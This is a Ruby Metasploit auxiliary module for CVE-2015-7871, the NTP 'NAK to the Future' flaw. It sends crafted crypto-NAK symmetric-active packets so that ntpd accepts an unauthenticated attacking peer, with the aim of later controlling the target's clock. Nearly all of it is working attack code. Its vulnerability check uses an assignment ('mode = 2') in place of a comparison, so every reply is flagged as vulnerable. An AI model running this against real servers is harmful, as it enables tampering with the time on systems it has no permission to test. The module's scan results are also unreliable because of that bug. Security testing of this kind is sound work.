##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::UDPScanner
  include Msf::Auxiliary::NTP

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'NTP "NAK to the Future"',
        'Description'    => %q(
          Crypto-NAK packets can be used to cause ntpd to accept time from
          unauthenticated ephemeral symmetric peers by bypassing the
          authentication required to mobilize peer associations.  This module
          sends these Crypto-NAK packets in order to establish an association
          between the target ntpd instance and the attacking client.  The end goal
          is to cause ntpd to declare the legitimate peers "false tickers" and
          choose the attacking client(s) as the preferred peer(s), allowing
          these peers to control time.
         ),
        'Author'         =>
          [
            'Jon Hart <jon_hart[at]rapid7.com>' # original metasploit module
          ],
        'License'        => MSF_LICENSE,
        'References'     =>
          [
            [ 'URL', 'http://talosintel.com/reports/TALOS-2015-0069/' ],
            [ 'URL', 'http://www.cisco.com/c/en/us/support/docs/availability/high-availability/19643-ntpm.html' ],
            [ 'URL', 'http://support.ntp.org/bin/view/Main/NtpBug2941' ],
            [ 'CVE', '2015-7871' ]
          ]
      )
    )

    register_options(
      [
        OptInt.new('OFFSET', [true, "Offset from local time, in seconds", 300])
      ], self.class)
  end

  def scanner_process(data, shost, _sport)
    @results[shost] ||= []
    @results[shost] << data
  end

  def scan_host(ip)
    probe = Rex::Proto::NTP::NTPSymmetric.new
    probe.stratum = 1
    probe.poll = 10
    probe.mode = 1
    now = Time.now
    # compute the timestamp.  NTP stores a timestamp as 64-bit unsigned
    # integer, the high 32-bits representing the number of seconds since era
    # epoch and the low 32-bits representing the fraction of a second.  The era
    # epoch in this case is Jan 1 1900, so we must add the number of seconds
    # between then and the ruby era epoch, Jan 1 1970, which is 2208988800
    ts = ((now.to_i + 2208988800 + datastore['OFFSET']) << 32) + now.nsec
    # TODO: use different values for each?
    probe.reference_timestamp = ts
    probe.origin_timestamp = ts
    probe.receive_timestamp = ts
    probe.transmit_timestamp = ts
    # key-id 0
    probe.payload = "\x00\x00\x00\x00"
    scanner_send(probe, ip, datastore['RPORT'])
    # TODO: whatever is next in order to let us win the race against the other peers
  end

  def scanner_postscan(batch)
    @results.keys.map do |host|
      @results[host].map do |response|
        ntp_symmetric = Rex::Proto::NTP::NTPSymmetric.new(response)
        if ntp_symmetric.mode = 2
          print_good("#{host}:#{rport} - NTP - VULNERABLE: Accepted a NTP symmetric active association")
          report_vuln(
            :host  => host,
            :port  => rport.to_i,
            :proto => 'udp',
            :sname => 'ntp',
            :name  => 'NTP "NAK to the Future"',
            :info  => "Accepted an NTP symmetric active association by replying with a symmetric passive request",
            :refs  => self.references
          )
        end
      end
    end
  end
end
